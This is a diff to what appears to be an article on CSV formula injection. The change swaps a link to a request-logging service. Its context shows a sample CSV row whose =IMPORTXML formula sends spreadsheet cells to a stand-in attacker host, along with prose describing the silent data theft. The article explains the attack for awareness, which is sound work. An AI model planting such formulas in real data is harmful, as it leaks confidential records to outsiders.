@@ -116,7 +116,7 @@ UserId,BillToDate,ProjectName,Description,DurationMinutes
 2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")",240
 ```
 
-The attacker starts the cell with their trusty `=` symbol prefix and then points `IMPORTXML` to a server they control, appending as a querystring of spreadsheet data. Now they can open up their server log and **bam**! Data that isn't theirs. [Try it yourself with a Requestb.in](https://requestb.in/).
+The attacker starts the cell with their trusty `=` symbol prefix and then points `IMPORTXML` to a server they control, appending as a querystring of spreadsheet data. Now they can open up their server log and **bam**! Data that isn't theirs. [Try it yourself with a Requestbin](https://www.requestbin.com/).
 
 The ultra sinister thing here? No warnings, no popups, no reason to think that anything is amiss. The attacker just enters a similarly formatted time/issue/whatever entry, eventually an administrator attempts to view a CSV export and all that limited-access data is immediately, and queitly sent away.
 
